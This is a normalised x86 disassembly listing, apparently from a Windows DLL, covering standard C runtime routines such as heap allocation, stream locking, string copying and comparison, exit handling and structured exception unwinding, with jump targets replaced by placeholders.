retn
push 0x4
call sub_1002d1b0
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_1002d9c2
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100272f4
sub_100272fd
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0xffffffe0
ja r-xdata
push esi
call sub_1002b638
pop ecx
call sub_1002972b
mov [ eax ] 0xc
xor eax eax
push ebx
push edi
mov edi [ HeapAlloc@IAT ]
mov eax [ rw-data ]
cmp eax 0x1
jne r-xdata
call sub_1002ce6d
push 0x1e
call sub_1002ccc2
push 0xff
call sub_10027b2c
cmp eax 0x3
jne r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
push esi
call sub_100272ae
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
mov eax esi
jmp r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
inc esi
mov ebx eax
test ebx ebx
jne r-xdata
push 0x0
push [ rw-data ]
call edi
push eax
jmp r-xdata
pop edi
mov eax ebx
pop ebx
jmp r-xdata
push 0xc
pop esi
cmp [ rw-data ] eax
je r-xdata
pop esi
pop ebp
retn
call sub_1002972b
mov [ eax ] esi
push [ ebp + 0x8 ]
call sub_1002b638
pop ecx
test eax eax
je r-xdata
call sub_1002972b
mov [ eax ] esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
sub_100273cd
mov eax [ rw-data ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_1002a045
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
jmp r-xdata
push 0x4
push esi
mov [ rw-data ] esi
call sub_1002a045
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov [ edx + eax ] ecx
add ecx 0x20
add edx 0x4
cmp ecx rw-data
jl r-xdata
push 0x1a
pop eax
pop esi
retn
mov eax [ rw-data ]
push 0xfffffffe
pop esi
xor edx edx
mov ecx rw-data
push edi
mov [ ecx ] esi
cmp eax esi
je r-xdata
mov eax edx
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
mov edi edx
and edi 0x1f
shl edi 0x6
mov eax [ edi + eax ]
cmp eax 0xffffffff
je r-xdata
pop edi
xor eax eax
pop esi
retn
test eax eax
jne r-xdata
add ecx 0x20
inc edx
cmp ecx rw-data
jl r-xdata
sub_1002749e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax rw-data
cmp esi eax
jb r-xdata
add esi 0x20
push esi
call [ EnterCriticalSection@IAT ]
cmp esi rw-data
ja r-xdata
mov ecx esi
sub ecx eax
sar ecx 0x5
add ecx 0x10
push ecx
call sub_1002d1b0
or [ esi + 0xc ] 0x8000
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_100274df
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_1002d1b0
mov eax [ ebp + 0xc ]
or [ eax + 0xc ] 0x8000
pop ecx
pop ebp
retn
sub_10027511
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rw-data
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_1002d0d6
pop ecx
pop ebp
retn
sub_1002754d
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0x14
mov eax [ ebp + 0xc ]
jge r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
add ecx 0x10
push ecx
call sub_1002d0d6
pop ecx
pop ebp
retn
sub_1002757c
push 0xc
push r--data
call sub_1002ca38
xor esi esi
mov [ ebp - 0x1c ] esi
xor eax eax
mov ebx [ ebp + 0x8 ]
cmp ebx esi
setne al
cmp eax esi
jne r-xdata
xor eax eax
cmp [ ebp + 0xc ] esi
setne al
cmp eax esi
je r-xdata
call sub_1002972b
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_1002480c
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov [ ebp + 0x8 ] ebx
push ebx
call sub_1002749e
pop ecx
mov [ ebp - 0x4 ] esi
test [ ebx + 0xc ] 0x40
jne r-xdata
call sub_1002ca7d
retn
cmp [ ebp - 0x1c ] esi
jne r-xdata
push ebx
call sub_1002ed42
pop ecx
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002768e
mov eax [ ebp - 0x1c ]
push ebx
call sub_10030ce6
mov edi eax
lea eax [ ebp + 0x10 ]
push eax
push esi
push [ ebp + 0xc ]
push ebx
call sub_1002e056
mov [ ebp - 0x1c ] eax
push ebx
push edi
call sub_10030d82
add esp 0x1c
mov ecx rw-data
cmp eax 0xfffffffe
je r-xdata
call sub_1002972b
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_1002480c
add esp 0x14
or [ ebp - 0x1c ] 0xffffffff
cmp eax 0xffffffff
je r-xdata
mov edx eax
sar edx 0x5
mov ecx eax
and ecx 0x1f
shl ecx 0x6
add ecx [ edx * 4 + rw-data ]
jmp r-xdata
mov eax rw-data
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
test [ eax + 0x24 ] 0x80
je r-xdata
sub_100276a0
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_10027728
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
test eax eax
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_1002bd74
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_10028858
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_10030fdc
mov [ esi + 0x4 ] eax
sub_100277af
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_10027728
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x1
lea eax [ ebp - 0x10 ]
push eax
push 0x1
push [ ebp + 0x8 ]
call sub_10031499
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_10027800
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_100277af
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x1
pop ebp
retn
sub_1002782e
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_10027728
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x2
lea eax [ ebp - 0x10 ]
push eax
push 0x2
push [ ebp + 0x8 ]
call sub_10031499
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_1002787f
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_1002782e
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x2
pop ebp
retn
sub_100278ad
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_10027728
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_10031499
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_100278fe
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_100278ad
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x4
pop ebp
retn
sub_1002792c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_10027728
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8
lea eax [ ebp - 0x10 ]
push eax
push 0x8
push [ ebp + 0x8 ]
call sub_10031499
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_1002797d
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_1002792c
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8
pop ebp
retn
sub_100279b0
push edi
mov edi [ esp + 0x8 ]
jmp r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
add ecx 0x1
test dl dl
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
add edi 0x1
test ecx 0x3
jne r-xdata
test dh dh
je r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_100279c0
mov ecx [ esp + 0x4 ]
push edi
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea edi [ ecx - 0x1 ]
jmp r-xdata
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x4 ]
test ah ah
je r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edi edi
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
add ecx 0x1
test dl dl
je r-xdata
lea edi [ ecx - 0x3 ]
jmp r-xdata
test eax 0xff0000
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
add edi 0x1
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x2 ]
jmp r-xdata
test eax 0xff000000
je r-xdata
test dh dh
je r-xdata
jmp r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_10027aa8
mov edi edi
push ebp
mov ebp esp
push edi
mov edi 0x3e8
pop edi
pop ebp
retn
test eax eax
je r-xdata
push edi
call [ Sleep@IAT ]
push [ ebp + 0x8 ]
call [ GetModuleHandleW@IAT ]
add edi 0x3e8
cmp edi 0xea60
ja r-xdata
sub_10027ad8
mov edi edi
push ebp
mov ebp esp
call sub_1002ce6d
push [ ebp + 0x8 ]
call sub_1002ccc2
push [ rw-data ]
call sub_1002bb28
push 0xff
call eax
add esp 0xc
pop ebp
retn
sub_10027b01
mov edi edi
push ebp
mov ebp esp
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
pop ebp
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_10027b56
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebp
retn
add esi 0x4
call eax
sub_10027b73
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_10027b97
mov edi edi
push ebp
mov ebp esp
cmp [ r--data ] 0x0
je r-xdata
call sub_10031551
push r--data
push r--data
call sub_10027b73
pop ecx
pop ecx
test eax eax
jne r-xdata
push r--data
call sub_10031610
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push sub_1002c7eb
call sub_10028434
mov eax r--data
mov [ esp ] r--data
call sub_10027b56
cmp [ rw-data ] 0x0
pop ecx
je r-xdata
push [ ebp + 0x8 ]
call [ r--data ]
pop ecx
xor eax eax
push rw-data
call sub_10031610
pop ecx
test eax eax
je r-xdata
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_10027c1c
push 0x18
push r--data
call sub_1002ca38
push 0x8
call sub_1002d1b0
pop ecx
and [ ebp - 0x4 ] 0x0
xor ebx ebx
inc ebx
cmp [ rw-data ] ebx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10027d33
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_1002ca7d
retn
mov [ rw-data ] ebx
push 0x8
call sub_1002d0d6
pop ecx
push [ ebp + 0x8 ]
call sub_10027b2c
push r--data
mov eax r--data
call sub_10027b56
pop ecx
push [ rw-data ]
call sub_1002bb28
pop ecx
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
je r-xdata
push r--data
mov eax r--data
call sub_10027b56
pop ecx
push [ rw-data ]
call sub_1002bb28
pop ecx
mov esi eax
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] esi
call sub_1002bb1f
cmp [ esi ] eax
je r-xdata
sub esi 0x4
mov [ ebp - 0x24 ] esi
cmp esi edi
jb r-xdata
cmp esi edi
jb r-xdata
push [ esi ]
call sub_1002bb28
mov edi eax
call sub_1002bb1f
mov [ esi ] eax
call edi
push [ rw-data ]
call sub_1002bb28
mov edi eax
push [ rw-data ]
call sub_1002bb28
add esp 0xc
cmp [ ebp - 0x1c ] edi
jne r-xdata
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x20 ] eax
mov esi eax
mov [ ebp - 0x24 ] esi
cmp [ ebp - 0x20 ] eax
je r-xdata
mov edi [ ebp - 0x28 ]
jmp r-xdata
sub_10027d83
mov edi edi
push esi
call sub_1002bb1f
mov esi eax
push esi
call sub_1002b629
push esi
call sub_10031983
push esi
call sub_100246d5
push esi
call sub_1002d025
push esi
call sub_10031974
push esi
call sub_10031762
push esi
call sub_10001a27
push esi
call sub_10031751
push sub_10027d5e
call sub_1002baad
add esp 0x24
mov [ rw-data ] eax
pop esi
retn
sub_10027dd1
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
pop edi
mov [ ebp - 0x4 ] eax
pop esi
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
leave
retn 0x8
test [ eax ] 0x8
je r-xdata
mov [ ebp - 0xc ] 0x1994000
sub_10027e1d
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov ebp [ ebp - 0x4 ]
mov esp [ ebx - 0x4 ]
jmp eax
sub_10027e56
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi [ fs : 0x0 ]
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call RtlUnwind
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and eax 0xfffffffd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov edi [ fs : 0x0 ]
mov ebx [ ebp - 0x4 ]
mov [ ebx ] edi
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_10027eaa
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1002afca
add esp 0x20
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_10027ee0
mov edi edi
push ebp
mov ebp esp
push esi
cld
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
xor ecx esi
call sub_100242d7
push 0x0
push esi
push [ esi + 0x14 ]
push [ esi + 0xc ]
push 0x0
push [ ebp + 0x10 ]
push [ esi + 0x10 ]
push [ ebp + 0x8 ]
call sub_1002afca
add esp 0x20
pop esi
pop ebp
retn
sub_10027f13
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
push ebx
cmp [ ebp + 0x8 ] 0x123
jne r-xdata
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] sub_10027fea
mov eax [ rw-data ]
lea ecx [ ebp - 0x28 ]
xor eax ecx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x10 ] eax
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x38 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x30 ] eax
call sub_1002bd74
mov eax [ eax + 0x80 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ ebp - 0x2c ]
pop ecx
pop ecx
and [ ebp - 0x38 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
pop ebx
leave
retn
mov eax [ ebp - 0x38 ]
sub_10027fea
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
cld
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x8 ]
xor ecx [ ebp + 0xc ]
call sub_100242d7
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x18 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
push [ ebp + 0x8 ]
call sub_1002afca
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
xor eax eax
inc eax
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x123
call sub_10027f13
add esp 0x1c
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_10027e56
pop ebx
leave
retn
sub_10028089
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x10 ]
mov esi [ edi + 0xc ]
mov [ ebp - 0x4 ] eax
mov ebx esi
jmp r-xdata
mov [ ebp + 0x8 ] esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebp + 0x14 ]
inc esi
mov [ eax ] esi
mov eax [ ebp + 0x18 ]
mov [ eax ] ebx
cmp ebx [ edi + 0xc ]
ja r-xdata
mov ecx [ ebp - 0x4 ]
dec esi
mov eax esi
imul eax eax 0x14
add eax ecx
mov ecx [ ebp + 0x10 ]
cmp [ eax + 0x4 ] ecx
jge r-xdata
call sub_10031719
call sub_10031719
cmp esi ebx
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x8 ]
jle r-xdata
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0xc ] 0x0
jge r-xdata
dec [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
sub_100280fe
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
call sub_1002bd74
mov eax [ eax + 0x98 ]
mov [ esi + 0x4 ] eax
call sub_1002bd74
mov [ eax + 0x98 ] esi
mov eax esi
pop esi
pop ebp
retn
sub_1002812a
mov edi edi
push ebp
mov ebp esp
call sub_1002bd74
mov eax [ eax + 0x98 ]
jmp r-xdata
test eax eax
jne r-xdata
mov ecx [ eax ]
cmp ecx [ ebp + 0x8 ]
je r-xdata
inc eax
pop ebp
retn
xor eax eax
pop ebp
retn
mov eax [ eax + 0x4 ]
sub_10028151
mov edi edi
push ebp
mov ebp esp
push esi
call sub_1002bd74
mov esi [ ebp + 0x8 ]
cmp esi [ eax + 0x98 ]
jne r-xdata
call sub_1002bd74
mov eax [ eax + 0x98 ]
jmp r-xdata
call sub_1002bd74
mov ecx [ esi + 0x4 ]
mov [ eax + 0x98 ] ecx
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ eax + 0x4 ]
cmp esi ecx
je r-xdata
pop esi
pop ebp
jmp sub_10031719
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax ecx
pop esi
pop ebp
retn
sub_100281a3
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
and [ ebp - 0x18 ] 0x0
lea ecx [ ebp - 0x18 ]
xor eax ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
inc eax
mov [ ebp - 0x14 ] sub_10027ee0
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_10031a00
mov ecx eax
mov eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_10028203
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_10028236
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_1002826c
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] eax
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_100282a2
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_1002830d
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
push [ rw-data ]
call sub_1002bb28
push [ rw-data ]
mov edi eax
mov [ ebp - 0x4 ] edi
call sub_1002bb28
mov esi eax
pop ecx
pop ecx
cmp esi edi
jb r-xdata
xor eax eax
